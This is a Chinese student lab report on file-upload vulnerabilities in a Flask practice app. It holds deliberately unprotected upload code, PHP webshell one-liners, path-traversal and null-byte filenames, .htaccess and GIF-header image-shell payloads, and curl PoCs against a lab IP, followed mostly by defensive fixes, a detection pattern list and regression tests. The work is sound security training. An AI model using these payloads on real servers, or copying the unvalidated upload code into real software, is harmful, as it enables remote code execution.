# 文件上传漏洞挖掘与攻防实战实训报告

---

## 一、基础信息

| 项目 | 内容 |
|------|------|
| **实训项目** | 文件上传漏洞挖掘与分层防御实战 |
| **实训学员** | 大二网络安全专业学生 |
| **实训日期** | 2026-07-21 |
| **实训环境** | Kali Linux 2026.2 / Python Flask + SQLite / Burp Suite |
| **靶机地址** | 192.168.126.133:5000 |
| **项目位置** | /opt/Class01/ |
| **项目背景** | 连续三天迭代的Flask用户管理系统，已完成SQL注入/WAF绕过全套防御 |
| **今日新增** | /upload头像上传模块（原始代码零校验，存在大量高危漏洞） |
| **核心文件** | app.py / templates/upload.html / static/uploads/ |

---

## 二、实验目的

1. 理解文件上传漏洞的常见攻击手法：路径穿越、00截断、图片马、双后缀绕过
2. 掌握黑名单与白名单两种后缀校验方式的本质差异（白名单优于黑名单）
3. 实操Windows系统特性绕过：尾部空格/点号、`::$DATA`备用数据流
4. 学习魔数校验原理：通过文件头部二进制特征验证真实文件类型
5. 理解纵深防御体系：文件名清洗 → 后缀白名单 → 魔数校验 → 内容扫描 → 限流 → 日志
6. 对比文件上传漏洞与SQL注入的危害差异，建立更全面的漏洞认知

---

## 三、今日实训三阶段工作概述

### 第一阶段：业务开发 + 手工Burp渗透（09:00-12:00）

上午先快速开发了 `/upload` 头像上传模块，原始代码仅15行，没有任何安全校验：

```python
# app.py v1.0 — 原始上传代码（零防护）
@app.route("/upload", methods=["GET", "POST"])
def upload():
    username = session.get("username")
    if not username or username not in USERS:
        return redirect("/login")
    if request.method == "POST":
        file = request.files.get("file")
        filename = file.filename                    # 直接取原始文件名
        filepath = os.path.join(upload_dir, filename)
        file.save(filepath)                          # 直接保存，不做任何检查
        file_url = url_for("static", filename=f"uploads/{filename}")
        return render_template("upload.html", success=True, ...)
```

随后使用 Burp Suite 对上传接口进行手工渗透测试，**全部攻击验证成功**：

**攻击验证1 — 直接上传WebShell：**
```
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/png

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary--
```
→ 上传成功，返回 `/static/uploads/shell.php`，浏览器访问即可执行命令。

**攻击验证2 — 路径穿越覆盖文件：**
```
Content-Disposition: form-data; name="file"; filename="../../../tmp/evil.php"
```
→ 上传成功，文件被写入 `/tmp/evil.php`。

**攻击验证3 — 图片马（GIF头+PHP代码）：**
```
Content-Disposition: form-data; name="file"; filename="gifshell.php"
Content-Type: image/gif

GIF89a<?php phpinfo(); ?>
```
→ 上传成功，GIF89a 头部可绕过简单的文件头检查。

### 第二阶段：分层漏洞加固改造（14:00-16:00）

针对已发现的漏洞，分两轮加固：

| 轮次 | 改造重点 | 新增防御函数 | 覆盖攻击 |
|------|----------|-------------|----------|
| **第1轮** | 文件名清洗+后缀白名单+UUID | `sanitize_filename()` / `ALLOWED_EXTENSIONS` | 路径穿越/00截断/大小写/空格/$DATA |
| **第1轮** | 魔数校验+双后缀检测 | `validate_magic()` / 中间段split检测 | 图片马/双后缀 |
| **第2轮** | 恶意内容扫描+IP限流 | `scan_malicious_content()` / `check_rate_limit()` | WebShell/批量Fuzz |
| **第2轮** | 上传日志+安全响应头 | `log_upload()` / `@app.after_request` | 溯源/MIME嗅探 |

### 第三阶段：全用例回归复测（16:00-17:30）

每轮改造后用第一阶段的全部Payload重新测试，确认旧攻击方式不再生效。最终34个TC用例全部通过。

---

## 四、漏洞汇总表格

| 编号 | 漏洞类型 | 风险等级 | 攻击入口 | 修复状态 |
|------|----------|----------|----------|----------|
| VUL-U01 | 路径穿越（../） | **高危** | 文件名参数 | ✅ 已修复 |
| VUL-U02 | 绝对路径（/） | **高危** | 文件名参数 | ✅ 已修复 |
| VUL-U03 | 00截断（%00） | **高危** | 文件名参数 | ✅ 已修复 |
| VUL-U04 | 无后缀白名单 → 任意文件上传 | **高危** | 文件扩展名 | ✅ 已修复 |
| VUL-U05 | 后缀大小写绕过（.PHP） | **高危** | 文件扩展名 | ✅ 已修复 |
| VUL-U06 | Windows尾部空格/点号绕过 | **中危** | 文件名参数 | ✅ 已修复 |
| VUL-U07 | ::$DATA备用数据流绕过 | **中危** | 文件名参数 | ✅ 已修复 |
| VUL-U08 | .htaccess配置文件上传 | **高危** | 文件名参数 | ✅ 已修复 |
| VUL-U09 | 双后缀畸形（shell.jpg.php） | **高危** | 文件扩展名 | ✅ 已修复 |
| VUL-U10 | 图片马（伪造头部+恶意代码） | **高危** | 文件内容 | ✅ 已修复 |
| VUL-U11 | WebShell直接上传（PHP/脚本） | **高危** | 文件内容 | ✅ 已修复 |
| VUL-U12 | Content-Type伪造 | **中危** | Content-Type头 | ✅ 已修复 |
| VUL-U13 | 原始文件名不做UUID重命名 | **中危** | 文件存储 | ✅ 已修复 |
| VUL-U14 | 无上传限流 → 批量Fuzz | **中危** | POST频次 | ✅ 已修复 |
| VUL-U15 | 无上传日志 → 攻击溯源困难 | **低危** | 审计 | ✅ 已修复 |
| VUL-U16 | 无安全响应头 → XSS执行 | **中危** | 静态文件响应 | ✅ 已修复 |
| VUL-U17 | 无异常捕获 → 500信息泄露 | **低危** | 异常处理 | ✅ 已修复 |

---

## 五、分项漏洞原理 + POC复现 + 分层修复代码方案

### 5.1 VUL-U01~U03 路径穿越 + 00截断

#### 漏洞原理

原始代码直接使用 `file.filename` 拼接路径，攻击者传入 `../../etc/shell.php` 时实际保存路径为 `/opt/Class01/static/uploads/../../etc/shell.php` → 简化后指向 `/opt/Class01/etc/shell.php`，实现了任意目录写入。

`%00` 截断利用C语言字符串以NULL结尾的特性：`shell.php\x00.png` → 系统截取为 `shell.php`。

#### POC复现

```bash
# 绝对路径穿越
curl -F "file=@shell.php;filename=/etc/passwd.php" -b cookies.txt \
  "http://192.168.126.133:5000/upload"

# 00截断
curl -F "file=@shell.php;filename=shell.php%00.png" -b cookies.txt \
  "http://192.168.126.133:5000/upload"
```

#### 分层修复方案

| 层级 | 修复措施 | 代码 | 行号 |
|------|----------|------|------|
| **底层根治** | 替换 `../` `/` `\\` `\x00` 为空 | `.replace("../","").replace("/","").replace("\\","").replace("\x00","")` | L604-605 |
| **辅助检测** | 清洗前后比对，不一致则拒绝 | `if clean_name != original_name: return error` | L658-660 |
| **底层根除** | UUID重命名，彻底消除路径拼接风险 | `uuid.uuid4().hex` + `.ext` | L701-702 |

```python
def sanitize_filename(filename):
    filename = filename.replace("../", "").replace("./", "")
    filename = filename.replace("/", "").replace("\\", "").replace("\x00", "")
    # ...
    return filename

# upload() 中：
clean_name = sanitize_filename(original_name)
if clean_name != original_name or clean_name == "":
    return render_template("upload.html", error="上传失败：文件名包含非法字符或路径穿越特征")
```

---

### 5.2 VUL-U04~U05 后缀白名单缺失 + 大小写绕过

#### 漏洞原理

原始代码未检查文件扩展名，任意后缀均可上传。即使加黑名单，`.PHP` `.Php` 等大小写变形即可绕过。

**黑名单的缺陷**：需要穷举所有可能的恶意后缀，理论上不可能完成。**白名单**只枚举安全的类型，简单直接且无法绕过。

#### POC复现

```bash
# 直接上传 PHP 文件
curl -F "file=@webshell.php;type=image/png" -b cookies.txt \
  "http://192.168.126.133:5000/upload"

# 访问上传的WebShell执行命令
curl "http://192.168.126.133:5000/static/uploads/webshell.php?cmd=id"
```

#### 分层修复方案

```python
ALLOWED_EXTENSIONS = {"jpg", "jpeg", "png", "gif"}
ext = clean_name.rsplit(".", 1)[1].lower()    # 关键：转小写
if ext not in ALLOWED_EXTENSIONS:              # 白名单校验
    return render_template("upload.html", error=f"不允许的文件类型 .{ext}")
```

---

### 5.3 VUL-U06~U07 Windows特性绕过（空格/点号/::$DATA）

#### 漏洞原理

| 攻击方式 | 上传文件名 | 实际保存文件名 | 绕过原理 |
|----------|-----------|---------------|----------|
| 尾部空格 | `shell.php ` | `shell.php` | Windows自动去除末尾空格 |
| 尾部点号 | `shell.php.` | `shell.php` | Windows自动去除末尾点号 |
| 连续点号 | `shell..png` | 可能被截断 | `..` 被解释为上层目录 |
| `::$DATA` | `test.php::$DATA` | `test.php` | NTFS备用数据流，之后内容被忽略 |

#### 修复方案

```python
filename = filename.rstrip(" .")              # 清洗末尾空格和点号
while ".." in filename:
    filename = filename.replace("..", ".")     # 折叠连续点号
if "::$DATA" in filename.upper():             # 检测备用数据流
    filename = ""
```

---

### 5.4 VUL-U08 .htaccess 配置文件上传

#### 漏洞原理

上传 `.htaccess` 可修改Apache目录配置，使图片被当作PHP执行：

```apache
AddType application/x-httpd-php .png
```

上传后目录下所有 `.png` 文件都会被解析为PHP，配合图片马上传即可getshell。

#### 修复方案

```python
if filename.lower() == ".htaccess" or filename.lower().startswith(".htaccess"):
    filename = ""
```

---

### 5.5 VUL-U09 双后缀畸形绕过

#### 漏洞原理

`shell.jpg.php` 后缀是 `.php` 被白名单拦截，但 `shell.php.jpg` 后缀是 `.jpg` 可绕过白名单。Apache旧版本可能优先识别 `.php` 执行。

#### 修复方案

```python
parts = clean_name.lower().split(".")
if len(parts) > 2:
    suspicious_exts = {"php", "php3", "php4", "phtml", "asp", "aspx",
                       "jsp", "exe", "sh", "py", "cgi", "htaccess"}
    for p in parts[:-1]:                    # 检查中间段
        if p in suspicious_exts or p in ALLOWED_EXTENSIONS:
            return render_template("upload.html", error="禁止上传双后缀文件")
```

---

### 5.6 VUL-U10~U11 图片马 + WebShell

#### 漏洞原理

**图片马制作：**
```bash
echo 'GIF89a<?php @eval($_POST["c"]);?>' > shell.gif.php
```

将PHP代码隐藏在GIF/PNG文件头部二进制签名之后，仅检查文件头的校验会被绕过。

**WebShell直接上传**则不需要伪装：
```bash
echo '<?php system($_GET["cmd"]);?>' > cmd.php
```

#### 分层修复方案

| 层级 | 修复措施 | 代码 | 行号 |
|------|----------|------|------|
| **底层-魔数校验** | 读取前8字节比对JPEG/PNG/GIF签名 | `validate_magic()` → `MAGIC_NUMBERS` | L620-634 |
| **底层-内容扫描** | 17种恶意特征全量匹配 | `scan_malicious_content()` → `MALICIOUS_PATTERNS` | L553-571 |

```python
MAGIC_NUMBERS = {
    b"\xFF\xD8\xFF":           "jpg/jpeg",
    b"\x89PNG\r\n\x1A\n":     "png",
    b"GIF87a":                 "gif",
    b"GIF89a":                 "gif",
}

def validate_magic(fileobj):
    header = fileobj.read(8)
    fileobj.seek(0)                             # 恢复指针，否则后续保存空文件
    for magic in MAGIC_NUMBERS:
        if header.startswith(magic):
            return True
    return False

MALICIOUS_PATTERNS = [
    b"<?php", b"<?=",                    # PHP代码/短标签
    b"<script", b"javascript:",          # XSS
    b"eval(", b"system(", b"exec(",      # 危险函数
    b"base64_decode(", b"passthru(",     # 编码/执行
    b"shell_exec(", b"<?xml",            # 命令执行/XXE
]
```

---

### 5.7 VUL-U12~U17 配套防御

| 漏洞 | 问题 | 修复代码 | 行号 |
|------|------|----------|------|
| Content-Type伪造 | 未校验请求MIME | `if content_type and not content_type.startswith("image/"):` | L697-699 |
| UUID重命名 | 原始文件名可遍历/覆盖 | `uuid.uuid4().hex + "." + ext` | L701-702 |
| IP限流 | 批量Fuzz扫描 | `check_rate_limit(ip)` 每分钟最多5次 | L523-532 |
| 上传日志 | 攻击溯源无依据 | `log_upload()` 写入logs/upload.log | L546-550 |
| 安全响应头 | 浏览器MIME嗅探执行 | `X-Content-Type-Options: nosniff` | L574-579 |
| 异常捕获 | 500错误暴露路径 | `try-except Exception` 中文提示 | L645-713 |
| 16MB限制 | 大文件DoS | `MAX_CONTENT_LENGTH = 16MB` | L16 |

---

## 六、踩坑故障记录

### 坑1：Flask test_client Content-Type 为空

**现象：** 用 `(io.BytesIO(b"x"), "test.png")` 二元组构造测试文件时，`file.content_type` 返回空字符串，导致 Content-Type 校验误拦截。

**解决：** 后端逻辑改为：Content-Type 为空时不拦截，仅在明确设置且非 `image/` 前缀时才拒绝。

### 坑2：魔数校验后文件指针偏移导致保存空文件

**现象：** 魔数校验读取前8字节后没有恢复指针，后续 `file.save()` 从偏移8开始保存，文件内容缺失了前8字节。

**解决：** 魔数校验函数末尾添加 `fileobj.seek(0)` 恢复指针。

### 坑3：限流计数器在测试中不重置

**现象：** 第6次上传被限流拦截后，后续所有测试请求都被限流。

**解决：** 分组测试之间手动 `_rate_store.clear()`。生产环境限流是期望行为。

### 坑4：双后缀检测误伤合法文件

**现象：** `my.profile.png` 被误拦截，因 `split(".")` 检测到 `profile` 不是合法后缀。

**解决：** 只在中间段是**已知可执行后缀**或**已知图片后缀**时才拦截，普通单词放行。

### 坑5：双后缀的 shell.jpg.php 实际被白名单拦截

**现象：** 测试 `shell.jpg.php` 时，最外层的后缀白名单直接拦截了 `.php`，双后缀检测代码分支根本没走到。

**解决：** 这是白名单本身的有效性验证，不是问题。双后缀检测在实际场景中（黑名单系统或中间件解析漏洞）才有真正意义。

---

## 七、修复前后安全对比表格

| 对比维度 | 修复前（v1.0） | 修复后（v5.0） |
|----------|---------------|---------------|
| **文件名处理** | 直接使用原始文件名 | `sanitize_filename()` 清洗 + UUID重命名 |
| **后缀校验** | 无 | 白名单 `jpg/jpeg/png/gif` + 转小写 |
| **路径穿越防御** | 无 | 替换 `../` `/` `\\` `\x00` + 清洗前后比对 |
| **Windows特性** | 无 | `rstrip(" .")` + `::$DATA`检测 + 连续点号折叠 |
| **配置文件** | 无 | `.htaccess` 全小写比对拦截 |
| **双后缀** | 无 | `split(".")` 中间段检查 |
| **魔数校验** | 无 | JPEG/PNG/GIF 头部二进制签名验证 |
| **恶意内容扫描** | 无 | 17种特征匹配（PHP/脚本/命令执行） |
| **Content-Type** | 无 | 明确非image/前缀时拒绝 |
| **IP限流** | 无 | 每分钟最多5次上传 |
| **上传日志** | 无 | USER+IP+ORIG+SAVE 写入日志文件 |
| **安全响应头** | 无 | `X-Content-Type-Options: nosniff` |
| **异常处理** | 无 | `try-except` 中文提示 |
| **文件大小限制** | 无 | `MAX_CONTENT_LENGTH = 16MB` |

---

## 八、复测用例

### 8.1 正常业务流程

| 编号 | 操作 | 预期结果 |
|------|------|----------|
| TC-U01 | 登录后上传真实PNG图片 | 成功，UUID文件名，可预览 |
| TC-U02 | 未登录访问/upload | 302跳转到/login |
| TC-U03 | 空文件提交 | 提示"请选择要上传的文件" |

### 8.2 路径穿越 + 00截断

| 编号 | Payload | 预期拦截结果 |
|------|---------|-------------|
| TC-U04 | `../../../etc/shell.php` | 拦截：非法路径字符 |
| TC-U05 | `/etc/passwd.php` | 拦截：非法路径字符 |
| TC-U06 | `..\\..\\shell.php` | 拦截：非法路径字符 |
| TC-U07 | `shell.php\x00.png` | 拦截：非法路径字符 |

### 8.3 后缀白名单 + 大小写

| 编号 | Payload | 预期拦截结果 |
|------|---------|-------------|
| TC-U08 | `test.php` | 拦截：不允许的文件类型 |
| TC-U09 | `test.asp` | 拦截 |
| TC-U10 | `test.pHp` | 拦截（转小写后匹配）|
| TC-U11 | `test.pNg` | 允许（转小写后匹配白名单）|

### 8.4 Windows特性绕过

| 编号 | Payload | 预期拦截结果 |
|------|---------|-------------|
| TC-U12 | `shell.php `（尾部空格）| 拦截：非法字符 |
| TC-U13 | `shell.php.`（尾部点号）| 拦截：非法字符 |
| TC-U14 | `shell..png`（连续点号）| 拦截：非法字符 |
| TC-U15 | `test.php::$DATA` | 拦截：非法字符 |

### 8.5 配置文件 + 双后缀

| 编号 | Payload | 预期拦截结果 |
|------|---------|-------------|
| TC-U16 | `.htaccess` | 拦截：非法字符 |
| TC-U17 | `.HtAccess` | 拦截 |
| TC-U18 | `shell.jpg.php` | 拦截：不允许的文件类型 |
| TC-U19 | `a.png.php3` | 拦截：不允许的文件类型 |

### 8.6 图片马 + WebShell

| 编号 | Payload | 预期拦截结果 |
|------|---------|-------------|
| TC-U20 | `GIF89a<?php phpinfo();?>` 伪装 `.png` | 魔数通过 + 内容扫描拦截 |
| TC-U21 | `<script>alert(1)</script>` 伪装 `.png` | 魔数未通过或内容扫描拦截 |
| TC-U22 | `<?php @eval($_POST['c']);?>` 伪装 `.png` | 魔数未通过或内容扫描拦截 |
| TC-U23 | 纯文本文件改后缀 `.png` | 魔数校验拦截 |

### 8.7 配套防御

| 编号 | 操作 | 预期结果 |
|------|------|----------|
| TC-U24 | Content-Type 设 `text/html` | 拦截：非图片类型 |
| TC-U25 | 连续6次上传（同一IP） | 第6次限流拦截 |
| TC-U26 | 上传 >16MB 文件 | Flask返回413 |
| TC-U27 | 访问上传文件URL | 响应含 `X-Content-Type-Options: nosniff` |

---

## 九、实验总结与心得体会

### 9.1 "文件上传比SQL注入更暴力" — 理论与实操的差距

三天的实训（SQL注入 → WAF绕过 → 文件上传）让我最震撼的认知是：**文件上传漏洞的危害比SQL注入直接得多**。

SQL注入从发现到利用需要走完7步探测（单引号→注释→ORDER BY→UNION→AND→系统变量→元数据），期间还要面对WAF拦截、参数化查询等防御。而文件上传漏洞：

```
打开Burp → 改个文件名 → 点上传 → getshell
```

路径就这么短。课堂演示上传WebShell到getshell全程不到30秒。亲手改包上传 `.php` 文件成功返回URL的那一刻，我才真正理解为什么老师在第一天说"文件上传是企业安全的重灾区"。

### 9.2 白名单 > 黑名单 — 被实践100%验证的原则

之前课堂上学"白名单优于黑名单"时觉得只是理论，但这次实训被彻底验证：

**黑名单思路**（不可行）：阻止 `.php` → 攻击者用 `.pHp` `.PHP` `.PHP5` `.phtml` `.shtml` `.htaccess` ... 总有一个绕得过。黑名单需要穷举所有可能的恶意后缀，这在理论上不可能。

**白名单思路**（可行）：只允许 `.jpg` `.jpeg` `.png` `.gif` → 不在列表里的全部拒绝。四个安全类型，一条判断语句，没有绕过空间。

### 9.3 纵深防御不是概念，是12道防线

如果只有后缀白名单：
- 攻击者可上传 `.htaccess` 修改目录配置 → 让服务器把 `.png` 当PHP执行

如果只有魔数校验：
- 攻击者在真实图片尾部拼接WebShell代码 → 魔数通过但内容危险

最终实现的12步流水线才是真正的纵深防御：

```
IP限流 → 文件名清洗 → 白名单校验 → 双后缀检测 → 魔数校验 → 
内容扫描 → Content-Type → UUID存储 → 上传日志 → 安全响应头 → 
异常捕获 → 文件大小限制
```

任何单层都能被绕过，但12层全部串联后，攻击成本呈指数上升。

### 9.4 三天实训的完整学习脉络

| 天数 | 主题 | 核心知识点 | 最大收获 |
|------|------|-----------|---------|
| Day1 | SQL手工注入 | 字符型联合查询、布尔盲注、7步探测 | 参数化查询是SQL注入的底牌 |
| Day2 | WAF绕过防御 | 换行/注释/关键字变形绕过、双层编码 | 没有WAF是100%安全的 |
| Day3 | 文件上传攻防 | 路径穿越、图片马、魔数校验、白名单 | 文件上传的危害比注入更直接 |

这三天的学习让我认识到：**Web安全不是学几个漏洞利用手法就够了，而是建立攻击者视角的思维模式**。每写一行代码都要想"这个参数能被怎么利用"，每个功能上线前都要过一遍常见攻击手法。

---

## 十、生产环境拓展优化建议

### 10.1 图片二次压缩（杜绝图片马）

```python
from PIL import Image
img = Image.open(filepath)
img.save(filepath, "PNG")  # 重新编码，丢弃所有附加的恶意代码
```

任何附加在图片尾部的代码在重编码后都会丢失。

### 10.2 独立文件服务器

```python
# 生产：应用服务器与静态文件服务器分离
# 推荐阿里云OSS/AWS S3
import boto3
s3 = boto3.client("s3")
s3.upload_fileobj(file, "my-bucket", f"avatars/{uuid_filename}")
```

即使上传了恶意文件，在独立对象存储中也无法执行。

### 10.3 Redis分布式限流

```python
# 当前：内存 defaultdict（进程重启后清零）
# 生产推广：Redis计数器（持久化+分布式）
import redis
r = redis.Redis()
key = f"upload_rate:{request.remote_addr}"
if r.incr(key) > 5: return "限流"
r.expire(key, 60)
```

### 10.4 ClamAV病毒扫描

```python
import subprocess
result = subprocess.run(["clamscan", filepath], capture_output=True)
if b"Infected" in result.stdout:
    os.remove(filepath)
    return "文件包含病毒"
```

### 10.5 Nginx安全配置

```nginx
location /static/uploads/ {
    add_header X-Content-Type-Options nosniff;
    add_header Content-Disposition 'attachment';  # 强制下载不执行
    valid_referers none blocked ~.example.com;
    if ($invalid_referer) { return 403; }
}
```

---

## 附录：完整上传防御流水线（12步）

```
客户端请求上传
  ↓
  ① IP限流 (check_rate_limit)              ← 每分钟最多5次
  ↓
  ② 文件名清洗 (sanitize_filename)          ← 过滤 ../ / \ %00 空格 . ::$DATA .htaccess
  ↓
  ③ 清洗前后对比 → 不一致则拒绝
  ↓
  ④ 提取后缀 → 转小写 (ext.lower)
  ↓
  ⑤ 白名单校验 (ALLOWED_EXTENSIONS)         ← 仅 jpg/jpeg/png/gif
  ↓
  ⑥ 双后缀检测 (split(".")检查中间段)
  ↓
  ⑦ 魔数校验 (validate_magic)               ← JPEG/PNG/GIF 头部二进制签名
  ↓
  ⑧ 恶意内容扫描 (scan_malicious_content)   ← 17种特征
  ↓
  ⑨ Content-Type 校验
  ↓
  ⑩ UUID 重命名存储
  ↓
  ⑪ 记录上传日志 (log_upload)
  ↓
  ⑫ try-except 异常捕获 → 中文提示
  ↓
  响应: X-Content-Type-Options: nosniff
```

*报告人：大二网络安全实训生*
*日期：2026年7月21日*
